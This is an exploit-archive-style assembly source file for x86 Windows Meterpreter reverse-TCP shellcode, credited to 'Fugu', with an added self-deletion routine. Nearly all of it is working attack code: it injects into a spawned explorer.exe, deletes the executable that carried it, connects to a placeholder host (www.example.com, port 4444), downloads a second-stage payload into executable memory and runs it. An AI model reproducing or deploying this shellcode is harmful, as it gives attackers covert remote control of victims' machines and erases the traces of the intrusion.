; Exploit Title: x86 windows shellcode - meterpreter/windows/reverse_tcp_dns_selfdel
; Date: Sun Nov 13 11:12:03 GMT 2016
; Exploit Author: Fugu
; Vendor Homepage: www.microsoft.com
; Version: all win
; Tested on: Windows 7(x86)X, 8.1(x86), 10(x86_64)
; Note: This is a standard meterpreter/windows/reverse_tcp_dns
;       with a little bonus, it will remove the exe that it 
;       gets injected/compiled into. 
; Warning: Do not run this from powershell.exe or any 
;       other system file exe, cause theres a chance
;       it will be erased forever. As is, no warranties.

section .bss

section .data

section .text
   global _start
      _start:
    cld                                          ; 00000000 FC             |.|
    call dword loc_88h                           ; 00000001 E882000000     |.....|
    pushad                                       ; 00000006 60             |`|
    mov ebp,esp                                  ; 00000007 89E5           |..|
    xor eax,eax                                  ; 00000009 31C0           |1.|
    mov edx,[fs:eax+0x30]                        ; 0000000B 648B5030       |d.P0|
    mov edx,[edx+0xc]                            ; 0000000F 8B520C         |.R.|
    mov edx,[edx+0x14]                           ; 00000012 8B5214         |.R.|
loc_15h:
    mov esi,[edx+0x28]                           ; 00000015 8B7228         |.r(|
    movzx ecx,word [edx+0x26]                    ; 00000018 0FB74A26       |..J&|
    xor edi,edi                                  ; 0000001C 31FF           |1.|
loc_1eh:
    lodsb                                        ; 0000001E AC             |.|
    cmp al,0x61                                  ; 0000001F 3C61           |<a|
    jl loc_25h                                   ; 00000021 7C02           ||.|
    sub al,0x20                                  ; 00000023 2C20           |, |
loc_25h:
    ror edi,byte 0xd                             ; 00000025 C1CF0D         |...|
    add edi,eax                                  ; 00000028 01C7           |..|
    loop loc_1eh                                 ; 0000002A E2F2           |..|
    push edx                                     ; 0000002C 52             |R|
    push edi                                     ; 0000002D 57             |W|
    mov edx,[edx+0x10]                           ; 0000002E 8B5210         |.R.|
    mov ecx,[edx+0x3c]                           ; 00000031 8B4A3C         |.J<|
    mov ecx,[ecx+edx+0x78]                       ; 00000034 8B4C1178       |.L.x|
    jecxz loc_82h                                ; 00000038 E348           |.H|
    add ecx,edx                                  ; 0000003A 01D1           |..|
    push ecx                                     ; 0000003C 51             |Q|
    mov ebx,[ecx+0x20]                           ; 0000003D 8B5920         |.Y |
    add ebx,edx                                  ; 00000040 01D3           |..|
    mov ecx,[ecx+0x18]                           ; 00000042 8B4918         |.I.|
loc_45h:
    jecxz loc_81h                                ; 00000045 E33A           |.:|
    dec ecx                                      ; 00000047 49             |I|
    mov esi,[ebx+ecx*4]                          ; 00000048 8B348B         |.4.|
    add esi,edx                                  ; 0000004B 01D6           |..|
    xor edi,edi                                  ; 0000004D 31FF           |1.|
loc_4fh:
    lodsb                                        ; 0000004F AC             |.|
    ror edi,byte 0xd                             ; 00000050 C1CF0D         |...|
    add edi,eax                                  ; 00000053 01C7           |..|
    cmp al,ah                                    ; 00000055 38E0           |8.|
    jnz loc_4fh                                  ; 00000057 75F6           |u.|
    add edi,[ebp-0x8]                            ; 00000059 037DF8         |.}.|
    cmp edi,[ebp+0x24]                           ; 0000005C 3B7D24         |;}$|
    jnz loc_45h                                  ; 0000005F 75E4           |u.|
    pop eax                                      ; 00000061 58             |X|
    mov ebx,[eax+0x24]                           ; 00000062 8B5824         |.X$|
    add ebx,edx                                  ; 00000065 01D3           |..|
    mov cx,[ebx+ecx*2]                           ; 00000067 668B0C4B       |f..K|
    mov ebx,[eax+0x1c]                           ; 0000006B 8B581C         |.X.|
    add ebx,edx                                  ; 0000006E 01D3           |..|
    mov eax,[ebx+ecx*4]                          ; 00000070 8B048B         |...|
    add eax,edx                                  ; 00000073 01D0           |..|
    mov [esp+0x24],eax                           ; 00000075 89442424       |.D$$|
    pop ebx                                      ; 00000079 5B             |[|
    pop ebx                                      ; 0000007A 5B             |[|
    popad                                        ; 0000007B 61             |a|
    pop ecx                                      ; 0000007C 59             |Y|
    pop edx                                      ; 0000007D 5A             |Z|
    push ecx                                     ; 0000007E 51             |Q|
    jmp eax                                      ; 0000007F FFE0           |..|
loc_81h:
    pop edi                                      ; 00000081 5F             |_|
loc_82h:
    pop edi                                      ; 00000082 5F             |_|
    pop edx                                      ; 00000083 5A             |Z|
    mov edx,[edx]                                ; 00000084 8B12           |..|
    jmp short loc_15h                            ; 00000086 EB8D           |..|
loc_88h:
    pop ebp                                      ; 00000088 5D             |]|
    xor eax,eax                                  ; 00000089 31C0           |1.|
    xor ecx,ecx                                  ; 0000008B 31C9           |1.|
    mov cl,0x15                                  ; 0000008D B115           |..|
loc_8fh:
    push eax                                     ; 0000008F 50             |P|
    loop loc_8fh                                 ; 00000090 E2FD           |..|
    lea ecx,[esp+0x44]                           ; 00000092 8D4C2444       |.L$D|
    push ecx                                     ; 00000096 51             |Q|
    lea ecx,[esp+0x4]                            ; 00000097 8D4C2404       |.L$.|
    push ecx                                     ; 0000009B 51             |Q|
    push eax                                     ; 0000009C 50             |P|
    push eax                                     ; 0000009D 50             |P|
    push eax                                     ; 0000009E 50             |P|
    add dword [esp],byte +0x44                   ; 0000009F 83042444       |..$D|
    push eax                                     ; 000000A3 50             |P|
    push eax                                     ; 000000A4 50             |P|
    push eax                                     ; 000000A5 50             |P|
    call dword loc_b8h                           ; 000000A6 E80D000000     |.....|
    db 'explorer.exe',0                          ; 000000AB 6578706c6f7265722e657865 |explorer.exe.|
loc_b8h:
    push eax                                     ; 000000B8 50             |P|
    push dword 0x863fcc79                        ; 000000B9 689FB590F3     |h....|
    call ebp                                     ; 000000BE FFD5           |..|
    push dword 0x51e2f352                        ; 000000C0 6878DC33BF     |hx.3.|
    call ebp                                     ; 000000C5 FFD5           |..|
    xor ecx,ecx                                  ; 000000C7 31C9           |1.|
    push ecx                                     ; 000000C9 51             |Q|
    push ecx                                     ; 000000CA 51             |Q|
    push ecx                                     ; 000000CB 51             |Q|
    push ecx                                     ; 000000CC 51             |Q|
    lea ecx,[esp+0xc]                            ; 000000CD 8D4C240C       |.L$.|
    push ecx                                     ; 000000D1 51             |Q|
    mov ecx,[esp+0x58]                           ; 000000D2 8B4C2458       |.L$X|
    push ecx                                     ; 000000D6 51             |Q|
    push eax                                     ; 000000D7 50             |P|
    push eax                                     ; 000000D8 50             |P|
    push dword 0xcbd5018d                        ; 000000D9 688D01D5CB     |h....|
    call ebp                                     ; 000000DE FFD5           |..|
    xor eax,eax                                  ; 000000E0 31C0           |1.|
loc_e2h:
    xor ecx,ecx                                  ; 000000E2 31C9           |1.|
    mov cl,0x41                                  ; 000000E4 B141           |.A|
loc_e6h:
    push eax                                     ; 000000E6 50             |P|
    loop loc_e6h                                 ; 000000E7 E2FD           |..|
    push eax                                     ; 000000E9 50             |P|
    add dword [esp],0x104                        ; 000000EA 81042404010000 |..$....|
    lea ecx,[esp+0x4]                            ; 000000F1 8D4C2404       |.L$.|
    push ecx                                     ; 000000F5 51             |Q|
    push eax                                     ; 000000F6 50             |P|
    push dword 0xfe61445d                        ; 000000F7 685D4461FE     |h]Da.|
    call ebp                                     ; 000000FC FFD5           |..|
    xor eax,eax                                  ; 000000FE 31C0           |1.|
    xor ecx,ecx                                  ; 00000100 31C9           |1.|
    mov cl,0xb3                                  ; 00000102 B1B3           |..|
loc_104h:
    push eax                                     ; 00000104 50             |P|
    loop loc_104h                                ; 00000105 E2FD           |..|
    mov dword [esp],0x10017                      ; 00000107 C7042417000100 |..$....|
    push esp                                     ; 0000010E 54             |T|
    mov ecx,[esp+0x420]                          ; 0000010F 8B8C2420040000 |..$ ...|
    push ecx                                     ; 00000116 51             |Q|
loc_117h:
    push dword 0xd1425c18                        ; 00000117 68185C42D1     |h.\B.|
    call ebp                                     ; 0000011C FFD5           |..|
    lea esp,[esp+0x90]                           ; 0000011E 8DA42490000000 |..$....|
    pop ecx                                      ; 00000125 59             |Y|
    lea esp,[esp+0x238]                          ; 00000126 8DA42438020000 |..$8...|
    xor eax,eax                                  ; 0000012D 31C0           |1.|
    push eax                                     ; 0000012F 50             |P|
    push eax                                     ; 00000130 50             |P|
    push esp                                     ; 00000131 54             |T|
    push ecx                                     ; 00000132 51             |Q|
    mov ecx,[esp+0x160]                          ; 00000133 8B8C2460010000 |..$`...|
    push ecx                                     ; 0000013A 51             |Q|
    push dword 0x593afc86                        ; 0000013B 6886FC3A59     |h..:Y|
    call ebp                                     ; 00000140 FFD5           |..|
    xor eax,eax                                  ; 00000142 31C0           |1.|
    mov al,[esp+0x7]                             ; 00000144 8A442407       |.D$.|
    rol eax,byte 0x8                             ; 00000148 C1C008         |...|
    mov al,[esp+0x4]                             ; 0000014B 8A442404       |.D$.|
    rol eax,byte 0x8                             ; 0000014F C1C008         |...|
    mov al,[esp+0x3]                             ; 00000152 8A442403       |.D$.|
    rol eax,byte 0x8                             ; 00000156 C1C008         |...|
    mov al,[esp+0x2]                             ; 00000159 8A442402       |.D$.|
    add eax,byte +0x30                           ; 0000015D 83C030         |..0|
    push esp                                     ; 00000160 54             |T|
    push byte +0x4                               ; 00000161 6A04           |j.|
    lea ecx,[esp+0xc]                            ; 00000163 8D4C240C       |.L$.|
    push ecx                                     ; 00000167 51             |Q|
    push eax                                     ; 00000168 50             |P|
    mov ecx,[esp+0x164]                          ; 00000169 8B8C2464010000 |..$d...|
    push ecx                                     ; 00000170 51             |Q|
    push dword 0x71f9d3c2                        ; 00000171 68C2D3F971     |h...q|
    call ebp                                     ; 00000176 FFD5           |..|
    mov eax,[esp+0x4]                            ; 00000178 8B442404       |.D$.|
    add eax,byte +0x8                            ; 0000017C 83C008         |...|
    push esp                                     ; 0000017F 54             |T|
    push byte +0x4                               ; 00000180 6A04           |j.|
    lea ecx,[esp+0xc]                            ; 00000182 8D4C240C       |.L$.|
    push ecx                                     ; 00000186 51             |Q|
    push eax                                     ; 00000187 50             |P|
    mov ecx,[esp+0x164]                          ; 00000188 8B8C2464010000 |..$d...|
    push ecx                                     ; 0000018F 51             |Q|
    push dword 0x71f9d3c2                        ; 00000190 68C2D3F971     |h...q|
    call ebp                                     ; 00000195 FFD5           |..|
    mov esi,[esp+0x4]                            ; 00000197 8B742404       |.t$.|
    push esp                                     ; 0000019B 54             |T|
    push byte +0x4                               ; 0000019C 6A04           |j.|
    lea ecx,[esp+0xc]                            ; 0000019E 8D4C240C       |.L$.|
    push ecx                                     ; 000001A2 51             |Q|
    push esi                                     ; 000001A3 56             |V|
    add dword [esp],byte +0x3c                   ; 000001A4 8304243C       |..$<|
    mov ecx,[esp+0x164]                          ; 000001A8 8B8C2464010000 |..$d...|
    push ecx                                     ; 000001AF 51             |Q|
    push dword 0x71f9d3c2                        ; 000001B0 68C2D3F971     |h...q|
    call ebp                                     ; 000001B5 FFD5           |..|
    mov eax,[esp+0x4]                            ; 000001B7 8B442404       |.D$.|
    add eax,esi                                  ; 000001BB 01F0           |..|
    push esp                                     ; 000001BD 54             |T|
    push byte +0x4                               ; 000001BE 6A04           |j.|
    lea ecx,[esp+0xc]                            ; 000001C0 8D4C240C       |.L$.|
    push ecx                                     ; 000001C4 51             |Q|
    push eax                                     ; 000001C5 50             |P|
    add dword [esp],byte +0x28                   ; 000001C6 83042428       |..$(|
    mov ecx,[esp+0x164]                          ; 000001CA 8B8C2464010000 |..$d...|
    push ecx                                     ; 000001D1 51             |Q|
    push dword 0x71f9d3c2                        ; 000001D2 68C2D3F971     |h...q|
    call ebp                                     ; 000001D7 FFD5           |..|
    add esi,[esp+0x4]                            ; 000001D9 03742404       |.t$.|
    lea ecx,[esp+0x4]                            ; 000001DD 8D4C2404       |.L$.|
    push ecx                                     ; 000001E1 51             |Q|
    push byte +0x40                              ; 000001E2 6A40           |j@|
    push dword 0x800                             ; 000001E4 6800080000     |h....|
    push esi                                     ; 000001E9 56             |V|
    mov ecx,[esp+0x164]                          ; 000001EA 8B8C2464010000 |..$d...|
    push ecx                                     ; 000001F1 51             |Q|
    push dword 0xcd61b5a6                        ; 000001F2 68A6B561CD     |h..a.|
    call ebp                                     ; 000001F7 FFD5           |..|
    mov eax,ebp                                  ; 000001F9 89E8           |..|
    sub eax,byte +0x6                            ; 000001FB 83E806         |...|
    xor ecx,ecx                                  ; 000001FE 31C9           |1.|
    push ecx                                     ; 00000200 51             |Q|
    push dword 0x89                              ; 00000201 6889000000     |h....|
    push eax                                     ; 00000206 50             |P|
    push esi                                     ; 00000207 56             |V|
    mov ecx,[esp+0x164]                          ; 00000208 8B8C2464010000 |..$d...|
    push ecx                                     ; 0000020F 51             |Q|
    push dword 0xe7bdd8c5                        ; 00000210 68C5D8BDE7     |h....|
    call ebp                                     ; 00000215 FFD5           |..|
    xor ecx,ecx                                  ; 00000217 31C9           |1.|
    push ecx                                     ; 00000219 51             |Q|
    push dword 0x200                             ; 0000021A 6800020000     |h....|
    jmp short loc_293h                           ; 0000021F EB72           |.r|
loc_221h:
    push esi                                     ; 00000221 56             |V|
    add dword [esp],0x89                         ; 00000222 81042489000000 |..$....|
    mov ecx,[esp+0x164]                          ; 00000229 8B8C2464010000 |..$d...|
    push ecx                                     ; 00000230 51             |Q|
    push dword 0xe7bdd8c5                        ; 00000231 68C5D8BDE7     |h....|
    call ebp                                     ; 00000236 FFD5           |..|
    xor ecx,ecx                                  ; 00000238 31C9           |1.|
    push ecx                                     ; 0000023A 51             |Q|
    push dword 0x15c                             ; 0000023B 685C010000     |h\...|
    lea ecx,[esp+0x10]                           ; 00000240 8D4C2410       |.L$.|
    push ecx                                     ; 00000244 51             |Q|
    push esi                                     ; 00000245 56             |V|
    add dword [esp],0x6a4                        ; 00000246 810424A4060000 |..$....|
    mov ecx,[esp+0x164]                          ; 0000024D 8B8C2464010000 |..$d...|
    push ecx                                     ; 00000254 51             |Q|
    push dword 0xe7bdd8c5                        ; 00000255 68C5D8BDE7     |h....|
    call ebp                                     ; 0000025A FFD5           |..|
    mov ecx,[esp+0x158]                          ; 0000025C 8B8C2458010000 |..$X...|
    push ecx                                     ; 00000263 51             |Q|
    push dword 0x8ef4092b                        ; 00000264 682B09F48E     |h+...|
    call ebp                                     ; 00000269 FFD5           |..|
    mov ecx,[esp+0x158]                          ; 0000026B 8B8C2458010000 |..$X...|
    push ecx                                     ; 00000272 51             |Q|
    push dword 0x528796c6                        ; 00000273 68C6968752     |h...R|
    call ebp                                     ; 00000278 FFD5           |..|
    mov ecx,[esp+0x154]                          ; 0000027A 8B8C2454010000 |..$T...|
    push ecx                                     ; 00000281 51             |Q|
    push dword 0x528796c6                        ; 00000282 68C6968752     |h...R|
    call ebp                                     ; 00000287 FFD5           |..|
    mov ebx,0x56a2b5f0                           ; 00000289 BBF0B5A256     |....V|
    push byte +0x0                               ; 0000028E 6A00           |j.|
    push ebx                                     ; 00000290 53             |S|
    call ebp                                     ; 00000291 FFD5           |..|
loc_293h:
    call dword loc_221h                          ; 00000293 E889FFFFFF     |.....|
    push dword 0xffffffff                        ; 00000298 6AFF           |j.|
    mov ecx,[ebp+0x7a2]                          ; 0000029A 8B8DA2070000   |......|
    push ecx                                     ; 000002A0 51             |Q|
    push dword 0x601d8708                        ; 000002A1 6808871D60     |h...`|
    call ebp                                     ; 000002A6 FFD5           |..|
    mov ecx,[ebp+0x7a2]                          ; 000002A8 8B8DA2070000   |......|
    push ecx                                     ; 000002AE 51             |Q|
    push dword 0x528796c6                        ; 000002AF 68C6968752     |h...R|
    call ebp                                     ; 000002B4 FFD5           |..|
loc_2b6h:
    lea ecx,[ebp+0x69e]                          ; 000002B6 8D8D9E060000   |......|
    push ecx                                     ; 000002BC 51             |Q|
    push dword 0x13dd2ed7                        ; 000002BD 68D72EDD13     |h....|
    call ebp                                     ; 000002C2 FFD5           |..|
    test eax,eax                                 ; 000002C4 85C0           |..|
    jz loc_2b6h                                  ; 000002C6 74EE           |t.|
    push dword 0x3233                            ; 000002C8 6833320000     |h32..|
    push dword 0x5f327377                        ; 000002CD 687773325F     |hws2_|
    push esp                                     ; 000002D2 54             |T|
    push dword 0x726774c                         ; 000002D3 684C772607     |hLw&.|
    call ebp                                     ; 000002D8 FFD5           |..|
    mov eax,0x190                                ; 000002DA B890010000     |.....|
    sub esp,eax                                  ; 000002DF 29C4           |).|
    push esp                                     ; 000002E1 54             |T|
    push eax                                     ; 000002E2 50             |P|
    push dword 0x6b8029                          ; 000002E3 6829806B00     |h).k.|
    call ebp                                     ; 000002E8 FFD5           |..|
    push eax                                     ; 000002EA 50             |P|
    push eax                                     ; 000002EB 50             |P|
    push eax                                     ; 000002EC 50             |P|
    push eax                                     ; 000002ED 50             |P|
    inc eax                                      ; 000002EE 40             |@|
    push eax                                     ; 000002EF 50             |P|
    inc eax                                      ; 000002F0 40             |@|
    push eax                                     ; 000002F1 50             |P|
    push dword 0xe0df0fea                        ; 000002F2 68EA0FDFE0     |h....|
    call ebp                                     ; 000002F7 FFD5           |..|
    xchg eax,edi                                 ; 000002F9 97             |.|
loc_2fah:
    call dword loc_30fh                          ; 000002FA E810000000     |.....|
    db 'www.example.com',0                       ; 000002FF 7777772e6578616d706c652e636f6d00 |www.example.com.|
loc_30fh:
    push dword 0x803428a9                        ; 0000030F 68678822EE     |hg.".|
    call ebp                                     ; 00000314 FFD5           |..|
    mov eax,[eax+0x1c]                           ; 00000316 8B401C         |.@.|
    push byte +0x5                               ; 00000319 6A05           |j.|
    push eax                                     ; 0000031B 50             |P|
    push dword 0x5c110002                        ; 0000031C 680200115C     |h...\|
    mov esi,esp                                  ; 00000321 89E6           |..|
loc_323h:
    push byte +0x10                              ; 00000323 6A10           |j.|
    push esi                                     ; 00000325 56             |V|
    push edi                                     ; 00000326 57             |W|
    push dword 0x6174a599                        ; 00000327 6899A57461     |h..ta|
    call ebp                                     ; 0000032C FFD5           |..|
    test eax,eax                                 ; 0000032E 85C0           |..|
    jz loc_33ch                                  ; 00000330 740A           |t.|
    dec dword [esi+0x8]                          ; 00000332 FF4E08         |.N.|
    jnz loc_323h                                 ; 00000335 75EC           |u.|
    call dword loc_39dh                          ; 00000337 E861000000     |.a...|
loc_33ch:
    push byte +0x0                               ; 0000033C 6A00           |j.|
    push byte +0x4                               ; 0000033E 6A04           |j.|
    push esi                                     ; 00000340 56             |V|
    push edi                                     ; 00000341 57             |W|
    push dword 0x5fc8d902                        ; 00000342 6802D9C85F     |h..._|
    call ebp                                     ; 00000347 FFD5           |..|
    cmp eax,byte +0x0                            ; 00000349 83F800         |...|
    jng loc_384h                                 ; 0000034C 7E36           |~6|
    mov esi,[esi]                                ; 0000034E 8B36           |.6|
    push byte +0x40                              ; 00000350 6A40           |j@|
    push dword 0x1000                            ; 00000352 6800100000     |h....|
    push esi                                     ; 00000357 56             |V|
    push byte +0x0                               ; 00000358 6A00           |j.|
    push dword 0xe553a458                        ; 0000035A 6858A453E5     |hX.S.|
    call ebp                                     ; 0000035F FFD5           |..|
    xchg eax,ebx                                 ; 00000361 93             |.|
    push ebx                                     ; 00000362 53             |S|
loc_363h:
    push byte +0x0                               ; 00000363 6A00           |j.|
    push esi                                     ; 00000365 56             |V|
    push ebx                                     ; 00000366 53             |S|
    push edi                                     ; 00000367 57             |W|
    push dword 0x5fc8d902                        ; 00000368 6802D9C85F     |h..._|
    call ebp                                     ; 0000036D FFD5           |..|
    cmp eax,byte +0x0                            ; 0000036F 83F800         |...|
    jnl loc_396h                                 ; 00000372 7D22           |}"|
    pop eax                                      ; 00000374 58             |X|
loc_375h:
    push dword 0x4000                            ; 00000375 6800400000     |h.@..|
    push byte +0x0                               ; 0000037A 6A00           |j.|
    push eax                                     ; 0000037C 50             |P|
    push dword 0x300f2f0b                        ; 0000037D 680B2F0F30     |h./.0|
    call ebp                                     ; 00000382 FFD5           |..|
loc_384h:
    push edi                                     ; 00000384 57             |W|
    push dword 0x614d6e75                        ; 00000385 68756E4D61     |hunMa|
    call ebp                                     ; 0000038A FFD5           |..|
    pop esi                                      ; 0000038C 5E             |^|
    pop esi                                      ; 0000038D 5E             |^|
    dec dword [esp]                              ; 0000038E FF0C24         |..$|
    jmp dword loc_2fah                           ; 00000391 E964FFFFFF     |.d...|
loc_396h:
    add ebx,eax                                  ; 00000396 01C3           |..|
    sub esi,eax                                  ; 00000398 29C6           |).|
    jnz loc_363h                                 ; 0000039A 75C7           |u.|
    ret                                          ; 0000039C C3             |.|
loc_39dh:
    mov ebx,0x56a2b5f0                           ; 0000039D BBF0B5A256     |....V|
    push byte +0x0                               ; 000003A2 6A00           |j.|
    push ebx                                     ; 000003A4 53             |S|
    call ebp                                     ; 000003A5 FFD5           |..|

